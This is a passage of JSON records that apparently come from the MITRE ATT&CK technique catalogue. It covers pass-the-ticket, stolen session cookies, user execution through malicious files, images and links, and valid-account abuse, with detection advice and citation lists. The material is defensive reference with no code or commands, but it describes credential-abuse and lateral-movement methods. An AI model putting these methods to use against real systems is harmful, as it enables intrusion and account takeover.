Apr 2019),(Citation: GitHub PoshC2),(Citation: Microsoft SIR Vol 19),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: CME Github September 2018),(Citation: NCSC Joint Report Public Tools),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: NSA Spotting),(Citation: GitHub IAD Secure Host Baseline UAC Filtering)"}
{"ID":"T1550.003","name":"Use Alternate Authentication Material: Pass the Ticket","description":"Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\n\nWhen preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)\n\nA [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)\n\nA [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)\n\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)","url":"https://attack.mitre.org/techniques/T1550/003","created":"30 January 2020","last modified":"30 March 2023","version":"1.1","tactics":"Defense Evasion, Lateral Movement","detection":"Audit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity.\n\nEvent ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to \"Integrity check on decrypted field failed\" and indicates misuse by a previously invalidated golden ticket.(Citation: CERT-EU Golden Ticket Protection)","platforms":"Windows","data sources":"Active Directory: Active Directory Credential Request, Logon Session: Logon Session Creation, User Account: User Account Authentication","is sub-technique":true,"sub-technique of":"T1550","defenses bypassed":"System Access Controls","contributors":"Ryan Becwar; Vincent Le Toux","permissions required":null,"supports remote":null,"system requirements":"Kerberos authentication enabled","impact type":null,"effective permissions":null,"relationship citations":"(Citation: Adsecurity Mimikatz Guide),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Mandiant No Easy Breach),(Citation: Symantec Seaduke 2015),(Citation: NCSC Joint Report Public Tools),(Citation: Harmj0y DCSync Sept 2015),(Citation: GitHub Pupy),(Citation: Cybereason Cobalt Kitty 2017),(Citation: AdSecurity Kerberos GT Aug 2015),(Citation: ADSecurity AD Kerberos Attacks),(Citation: STIG krbtgt reset),(Citation: ADSecurity Kerberos and KRBTGT)"}
{"ID":"T1550.004","name":"Use Alternate Authentication Material: Web Session Cookie","description":"Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)\n\nAuthentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) or [Web Cookies](https://attack.mitre.org/techniques/T1606/001), the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.\n\nThere have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)","url":"https://attack.mitre.org/techniques/T1550/004","created":"30 January 2020","last modified":"30 March 2023","version":"1.3","tactics":"Defense Evasion, Lateral Movement","detection":"Monitor for anomalous access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations.","platforms":"Google Workspace, IaaS, Office 365, SaaS","data sources":"Application Log: Application Log Content, Web Credential: Web Credential Usage","is sub-technique":true,"sub-technique of":"T1550","defenses bypassed":"System Access Controls","contributors":"Jen Burns, HubSpot; Johann Rehberger","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Volexity SolarWinds),(Citation: CrowdStrike StellarParticle January 2022),"}
{"ID":"T1204","name":"User Execution","description":"An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\nAdversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary, or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204). For example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)","url":"https://attack.mitre.org/techniques/T1204","created":"18 April 2018","last modified":"19 April 2022","version":"1.5","tactics":"Execution","detection":"Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain Initial Access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).","platforms":"Containers, IaaS, Linux, Windows, macOS","data sources":"Application Log: Application Log Content, Command: Command Execution, Container: Container Creation, Container: Container Start, File: File Creation, Image: Image Creation, Instance: Instance Creation, Instance: Instance Start, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Oleg Skulkin, Group-IB","permissions required":null,"supports remote":false,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: MSTIC DEV-0537 Mar 2022),(Citation: win10_asr)"}
{"ID":"T1204.002","name":"User Execution: Malicious File","description":"An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).","url":"https://attack.mitre.org/techniques/T1204/002","created":"11 March 2020","last modified":"21 April 2023","version":"1.3","tactics":"Execution","detection":"Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain initial access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).","platforms":"Linux, Windows, macOS","data sources":"File: File Creation, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1204","defenses bypassed":null,"contributors":"TruKno","permissions required":null,"supports remote":false,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Symantec Elderwood Sept 2012),(Citation: FireEye Obfuscation June 2017),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: Group IB Silence Sept 2018),(Citation: HackerNews IndigoZebra July 2021),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: Trend Micro DRBControl February 2020),(Citation: Cybereason Oceanlotus May 2017),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: FireEye APT32 April 2020),(Citation: CSM Elderwood Sept 2012),(Citation: Trend Micro Black Basta May 2022),(Citation: CISA AppleJeus Feb 2021),(Citation: Symantec Tick Apr 2016),(Citation: Securelist MuddyWater Oct 2018),(Citation: Unit 42 Cobalt Gang Oct 2018),(Citation: Proofpoint TA505 June 2018),(Citation: ATT Sidewinder January 2021),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: Kaspersky WIRTE November 2021),(Citation: Crowdstrike Qakbot October 2020),(Citation: Flashpoint FIN 7 March 2019),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: SecureWorks August 2019),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Antiy CERT Ramsay April 2020),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: ESET OceanLotus),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: ESET Nomadic Octopus 2018),(Citation: Unit 42 KerrDown February 2019),(Citation: Crowdstrike Helix Kitten Nov 2018),(Citation: McAfee Lazarus Jul 2020),(Citation: AhnLab Andariel Subgroup of Lazarus June 2018),(Citation: ClearSky Kittens Back 3 August 2020),(Citation: Trend Micro TA505 June 2019),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Symantec Gallmaker Oct 2018),(Citation: Unit 42 NETWIRE April 2020),(Citation: Unit 42 QUADAGENT July 2018),(Citation: SecureList Silence Nov 2017),(Citation: FireEye APT37 Feb 2018),(Citation: Juniper IcedID June 2020),(Citation: BitDefender Chafer May 2020),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Talos Promethium June 2020),(Citation: Secure List Bad Rabbit),(Citation: Microsoft Actinium February 2022),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Bitdefender StrongPity June 2020),(Citation: Carbon Black JCry May 2019),(Citation: NTT Security Flagpro new December 2021),(Citation: ESET Casbaneiro Oct 2019),(Citation: Palo Alto Brute Ratel July 2022),(Citation: ESET Gamaredon June 2020),(Citation: Proofpoint Bumblebee April 2022),(Citation: Group IB RTM August 2019),(Citation: Talos Bisonal Mar 2020),(Citation: Checkpoint Dridex Jan 2021),(Citation: Proofpoint TA505 Jan 2019),(Citation: Symantec WastedLocker June 2020),(Citation: Bitdefender Agent Tesla April 2020),(Citation: Securelist Darkhotel Aug 2015),(Citation: Trend Micro Muddy Water March 2021),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: TrendMicro Msiexec Feb 2018),(Citation: ClearSky Siamesekitten August 2021),(Citation: Cybereason Bumblebee August 2022),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: Talos Cobalt Group July 2018),(Citation: Proofpoint TA505 October 2019),(Citation: ESET Bad Rabbit),(Citation: TrendMicro BlackTech June 2017),(Citation: Cybereason Valak May 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: McAfee Honeybee),(Citation: Unit 42 Gamaredon February 2022),(Citation: TrendMicro Gamaredon April 2020),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: Check Point APT34 April 2021),(Citation: TrendMicro Patchwork Dec 2017),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: Rancor Unit42 June 2018),(Citation: DFIR Conti Bazar Nov 2021),(Citation: FireEye NETWIRE March 2019),(Citation: CISA AA20-301A Kimsuky),(Citation: eSentire FIN7 July 2021),(Citation: Google TAG Ukraine Threat Landscape March 2022),(Citation: CERT-EE Gamaredon January 2021),(Citation: ESET Machete July 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: Talos Transparent Tribe May 2021),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: FireEye APT30),(Citation: FireEye FIN7 April 2017),(Citation: Google EXOTIC LILY March 2022),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: SentinelOne Valak June 2020),(Citation: Unit 42 Inception November 2018),(Citation: Unit 42 TA551 Jan 2021),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: FireEye admin@338),(Citation: VirusBulletin Kimsuky October 2019),(Citation: Unit 42 Sofacy Feb 2018),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Trend Micro Tick November 2019),(Citation: Talos MuddyWater Jan 2022),(Citation: Proofpoint NETWIRE December 2020),(Citation: Anomali Pirate Panda April 2020),(Citation: Unit42 Molerat Mar 2020),(Citation: Unit 42 CARROTBAT November 2018),(Citation: Trend Micro IXESHE 2012),(Citation: Symantec Shuckworm January 2022),(Citation: Symantec Bumblebee June 2022),(Citation: Symantec Chafer February 2018),(Citation: Lazarus APT January 2022),(Citation: Avira Mustang Panda January 2020),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: ProofPoint SettingContent-ms July 2018),(Citation: Cylance Shaheen Nov 2018),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: SANS Windshift August 2018),(Citation: FBI FLASH APT39 September 2020),(Citation: Anomali Static Kitten February 2021),(Citation: FireEye Operation Saffron Rose 2013),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: Qualys LolZarus),(Citation: Trend Micro Qakbot May 2020),(Citation: FireEye MuddyWater Mar 2018),(Citation: FireEye APT10 April 2017),(Citation: Unit 42 Valak July 2020),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: Talos Oblique RAT March 2021),(Citation: Cybereason Molerats Dec 2020),(Citation: CheckPoint Naikon May 2020),(Citation: Unit 42 CARROTBAT January 2020),(Citation: G Data Sodinokibi June 2019),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: TrendMicro EarthLusca 2022),(Citation: Dragos Hexane),(Citation: Malwarebytes Konni Aug 2021),(Citation: Kroll Qakbot June 2020),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Volexity Patchwork June 2018),(Citation: McAfee Sharpshooter December 2018),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Trend Micro Banking Malware Jan 2019),(Citation: Uptycs Confucius APT Jan 2021),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: IBM TA505 April 2020),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Unit 42 ProjectM March 2016),(Citation: Proofpoint Leviathan Oct 2017),(Citation: CISA AA21-200A APT40 July 2021),(Citation: FireEye APT39 Jan 2019),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: Recorded Future REDDELTA July 2020),(Citation: TrendMicro Taidoor),(Citation: Moran 2014),(Citation: ESET Telebots Dec 2016),(Citation: Cybereason Chaes Nov 2020),(Citation: Carbon Black Emotet Apr 2019),(Citation: Securelist Octopus Oct 2018),(Citation: Accenture Hogfish April 2018),(Citation: ATT QakBot April 2021),(Citation: ESET T3 Threat Report 2021),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Cyberreason Anchor December 2019),(Citation: ESET Operation Spalax Jan 2021),(Citation: Secureworks IRON TILDEN Profile),(Citation: FireEye Fin8 May 2016),(Citation: Deep Instinct Black Basta August 2022),(Citation: Check Point Warzone Feb 2020),(Citation: FireEye Hancitor),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: TrendMicro Tonto Team October 2020),(Citation: CheckPoint Bandook Nov 2020),(Citation: ClearSky MuddyWater June 2019),(Citation: Accenture MUDCARP March 2019),(Citation: Symantec Whitefly March 2019),(Citation: ESET OceanLotus Mar 2019),(Citation: Cylance Dust Storm),(Citation: Microsoft Holmium June 2020),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: CrowdStrike Grim Spider May 2019),(Citation: Symantec Inception Framework March 2018),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: Cylance Machete Mar 2017),(Citation: FireEye APT19),(Citation: Proofpoint TA459 April 2017),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: Cybereason Kimsuky November 2020),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Microsoft PLATINUM April 2016),(Citation: 360 Machete Sep 2020),(Citation: IBM Grandoreiro April 2020),(Citation: Malwarebytes Higaisa 2020),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: US-CERT TYPEFRAME June 2018),(Citation: Trend Micro Black Basta Spotlight September 2022),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: Trend Micro Qakbot December 2020),(Citation: ESET InvisiMole June 2020),(Citation: McAfee Bankshot),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Unit 42 Playbook Dec 2017),(Citation: FireEye Metamorfo Apr 2018),(Citation: Kaspersky QakBot September 2021),(Citation: Picus Sodinokibi January 2020),(Citation: Unit42 Redaman January 2019),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Malwarebytes Pony April 2016),(Citation: Intego Shlayer Feb 2018),(Citation: Reaqta MuddyWater November 2017),(Citation: TrendMicro Trickbot Feb 2019),(Citation: IBM IcedID November 2017),(Citation: Kaspersky MoleRATs April 2019),(Citation: HP SVCReady Jun 2022),(Citation: Securelist Machete Aug 2014),(Citation: Microsoft DUBNIUM July 2016),(Citation: Secureworks IRON HEMLOCK Profile),(Citation: ClearSky Lazarus Aug 2020),(Citation: Talos Lokibot Jan 2021),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Talos MuddyWater May 2019),(Citation: Talos Frankenstein June 2019),(Citation: Zscaler Higaisa 2020),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Group IB Ransomware September 2020),(Citation: Carbon Black Shlayer Feb 2019),(Citation: Visa FIN6 Feb 2019),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Carbon Black HotCroissant April 2020),(Citation: F-Secure The Dukes),(Citation: Gigamon Berserk Bear October 2021),(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: Rewterz Sidewinder APT April 2020),(Citation: Cybereason TA505 April 2019),(Citation: McAfee REvil October 2019),(Citation: ThreatConnect Kimsuky September 2020),(Citation: FireEye APT10 Sept 2018),(Citation: Proofpoint TA505 Mar 2018),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Talos PoetRAT April 2020),(Citation: Cyberint Qakbot May 2021),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Cyble Sidewinder September 2020),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Proofpoint TA505 Sep 2017),(Citation: win10_asr)"}
{"ID":"T1204.003","name":"User Execution: Malicious Image","description":"Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware](https://attack.mitre.org/techniques/T1608/001), and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.(Citation: Summit Route Malicious AMIs)\n\nAdversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: Aqua Security Cloud Native Threat Report June 2021)","url":"https://attack.mitre.org/techniques/T1204/003","created":"30 March 2021","last modified":"26 August 2021","version":"1.1","tactics":"Execution","detection":"Monitor the local image registry to make sure malicious images are not added. Track the deployment of new containers, especially from newly built images. Monitor the behavior of containers within the environment to detect anomalous behavior or malicious activity after users deploy from malicious images.","platforms":"Containers, IaaS","data sources":"Application Log: Application Log Content, Command: Command Execution, Container: Container Creation, Container: Container Start, Image: Image Creation, Instance: Instance Creation, Instance: Instance Start","is sub-technique":true,"sub-technique of":"T1204","defenses bypassed":null,"contributors":"Center for Threat-Informed Defense (CTID); Vishwas Manral, McAfee","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Lacework TeamTNT May 2021),(Citation: Content trust in Azure Container Registry),(Citation: Content trust in Docker)"}
{"ID":"T1204.001","name":"User Execution: Malicious Link","description":"An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002).","url":"https://attack.mitre.org/techniques/T1204/001","created":"11 March 2020","last modified":"11 March 2020","version":"1.0","tactics":"Execution","detection":"Inspect network traffic for indications that a user visited a malicious site, such as links included in phishing campaigns directed at your organization.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded from a link and executed on the user's computer.","platforms":"Linux, Windows, macOS","data sources":"File: File Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content","is sub-technique":true,"sub-technique of":"T1204","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Symantec Elderwood Sept 2012),(Citation: FireEye Obfuscation June 2017),(Citation: FireEye APT33 Sept 2017),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: CSM Elderwood Sept 2012),(Citation: CISA AppleJeus Feb 2021),(Citation: MSTIC NOBELIUM May 2021),(Citation: Unit 42 Cobalt Gang Oct 2018),(Citation: Proofpoint TA505 June 2018),(Citation: ATT Sidewinder January 2021),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: Secureworks IRON RITUAL USAID Phish May 2021),(Citation: ESET Grandoreiro April 2020),(Citation: Crowdstrike Helix Kitten Nov 2018),(Citation: ClearSky Kittens Back 3 August 2020),(Citation: Trend Micro TA505 June 2019),(Citation: Unit 42 NETWIRE April 2020),(Citation: Unit 42 QUADAGENT July 2018),(Citation: McAfee Night Dragon),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: KISA Operation Muzabi),(Citation: Zscaler Bazar September 2020),(Citation: Proofpoint Bumblebee April 2022),(Citation: JPCert TSCookie March 2018),(Citation: Proofpoint TA505 Jan 2019),(Citation: Certfa Charming Kitten January 2021),(Citation: Trend Micro Muddy Water March 2021),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: Cybereason Bumblebee August 2022),(Citation: Talos Cobalt Group July 2018),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: Proofpoint TA505 October 2019),(Citation: Volexity Ocean Lotus November 2020),(Citation: TrendMicro BlackTech June 2017),(Citation: FOX-IT May 2016 Mofang),(Citation: Threatpost Hancitor),(Citation: TrendMicro Patchwork Dec 2017),(Citation: FireEye NETWIRE March 2019),(Citation: ESET Machete July 2019),(Citation: Talos Transparent Tribe May 2021),(Citation: Google EXOTIC LILY March 2022),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Symantec Elfin Mar 2019),(Citation: Unit42 Molerat Mar 2020),(Citation: ProofPoint SettingContent-ms July 2018),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: SANS Windshift August 2018),(Citation: FBI FLASH APT39 September 2020),(Citation: Anomali Static Kitten February 2021),(Citation: Google Election Threats October 2020),(Citation: Trend Micro Qakbot May 2020),(Citation: Talos Oblique RAT March 2021),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: TrendMicro EarthLusca 2022),(Citation: Kroll Qakbot June 2020),(Citation: ESET Lazarus Jun 2020),(Citation: Volexity Patchwork June 2018),(Citation: Trend Micro Banking Malware Jan 2019),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Proofpoint Leviathan Oct 2017),(Citation: CISA AA21-200A APT40 July 2021),(Citation: FireEye APT39 Jan 2019),(Citation: Carbon Black Emotet Apr 2019),(Citation: FireEye Clandestine Wolf),(Citation: Symantec Patchwork),(Citation: ATT QakBot April 2021),(Citation: ESET Operation Spalax Jan 2021),(Citation: FireEye Shining A Light on DARKSIDE May 2021),(Citation: FireEye Fin8 May 2016),(Citation: Kaspersky LuminousMoth July 2021),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: ESET EvilNum July 2020),(Citation: Cylance Dust Storm),(Citation: Cylance Machete Mar 2017),(Citation: Trend Micro Black Basta October 2022),(Citation: Cybereason Cobalt Kitty 2017),(Citation: IBM Grandoreiro April 2020),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Trend Micro Qakbot December 2020),(Citation: Kaspersky QakBot September 2021),(Citation: Malwarebytes Pony April 2016),(Citation: Cybereason Bazar July 2020),(Citation: Kaspersky MoleRATs April 2019),(Citation: Securelist Machete Aug 2014),(Citation: ClearSky Lazarus Aug 2020),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: McAfee Dianxun March 2021),(Citation: Group IB Ransomware September 2020),(Citation: Unit 42 BackConfig May 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: FireEye APT29 Nov 2018),(Citation: Rewterz Sidewinder APT April 2020),(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: Cybereason TA505 April 2019),(Citation: US District Court Indictment GRU Oct 2018),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: Proofpoint TA505 Mar 2018),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: Cyble Sidewinder September 2020),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Proofpoint TA505 Sep 2017),"}
{"ID":"T1078","name":"Valid Accounts","description":"Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)","url":"https://attack.mitre.org/techniques/T1078","created":"31 May 2017","last modified":"30 March 2023","version":"2.6","tactics":"Defense Evasion, Initial Access, Persistence, Privilege Escalation","detection":"Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.","platforms":"Azure AD, Containers, Google Workspace, IaaS, Linux, Network, Office 365, SaaS, Windows, macOS","data sources":"Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, User Account: User Account Authentication","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Anti-virus, Application Control, Firewall, Host Intrusion Prevention Systems, Network Intrusion Detection System, System Access Controls","contributors":"Goldstein Menachem; Jon Sternstein, Stern Security; Mark Wee; Netskope; Praetorian; Prasad Somasamudram, McAfee; Sekhar Sarukkai, McAfee; Syed Ummar Farooqh, McAfee; Yossi Weizman, Azure Defender Research Team","permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":"Administrator, User","relationship citations":"(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Bizeul 2014),(Citation: Securelist APT10 March 2021),(Citation: DarkReading FireEye FIN5 Oct 2015),(Citation: Group IB Silence Sept 